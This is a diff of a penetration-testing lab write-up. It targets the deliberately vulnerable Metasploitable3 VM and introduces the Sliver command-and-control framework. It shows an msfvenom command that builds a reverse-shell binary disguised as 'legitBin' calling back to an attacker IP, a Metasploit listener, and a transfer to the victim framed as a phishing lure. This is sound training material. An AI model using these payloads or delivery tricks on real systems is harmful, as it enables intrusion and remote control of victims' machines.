@@ -9,20 +9,20 @@ A payload generator and encoder
 - Source: msfvenom man pages
 
 ## Target
-`metasploitable3` is todays victim:
+`metasploitable3` is todays victim, fire it up:
 ```bash
 $ vagrant up ub1404
 ```
-More on ms3 [here](<https://github.com/rapid7/metasploitable3>). And here's how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.
+More on ms3 [here](<https://github.com/rapid7/metasploitable3>) and how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.
 
 
-## ReverC 🐚
+## Reverse 🐚
 Fire up Kali and sraight to man pages we go:
 ```bash
 $ man msfvenom
 ```
 
-I got the basic idea but didn't know which output `format` to use, so we do:
+I got the basic idea but didn't know which `output format` to use, so we do:
 ```bash
 $ msfvenom --list formats
 ```
@@ -31,18 +31,17 @@ Then craft the payload:
 ```bash
 $ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin
 
-# Make the binary/payload executable:
+# Make the payload executable:
 $ chmod +x legitBin
 ```
 Flags explained:
-- `-p`: Payload to use `linux/x86/shell_reverse_tcp`
-- `-f`: Output format `elf`
-  - elf a.k.a Executable & Linkable Format is a binary format which can be executed on the system 
-- `-o`: Output file `name_of_the_file`
-
+- `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
+- `-f`: Output format: `elf`
+  - Executable & Linkable Format is a binary format which can be executed on the system 
+- `-o`: Where to store output
 
 > [!TIP]
-> Use tab completion to your advantage. For example, after specifying the platform `linux/` (in this case), press tab a few times to get all the available options!
+> Use tab completion to your advantage. For example, after specifying the platform `linux/`, press tab a few times to get all the available options!
 
 
 In `msfconsole` we use the `multi/handler` module to set up a listener:
@@ -72,7 +71,9 @@ Host is up
 ```bash
 $ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
 ```
-I'm using `rsync` to send it over via SSH, let's use our imagination here and say we sent the victim a link which it clicked and downloaded & executed the binary.
+We're sending the payload via SSH using `rsync`, but let's use our imagination here and say we did a successful phishing campaign! ;)
+
+The victim clicked a link which downloaded & executed the binary:
 
 <img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />
 
@@ -123,9 +124,7 @@ This makes it obvious that somebody is connected to the machine and executing sh
 - Show an example of an HTTP-connection using Sliver
 
 ## Sliver?
-"A powerful command and control framework designed to provide advanced capabilities for covertly managing and controlling remote systems"
-- [Source](<https://sliver.sh/>)
-
+"A powerful [command and control framework](<https://sliver.sh/>) designed to provide advanced capabilities for covertly managing and controlling remote systems"
 
 ## Install on kali:
 ```bash
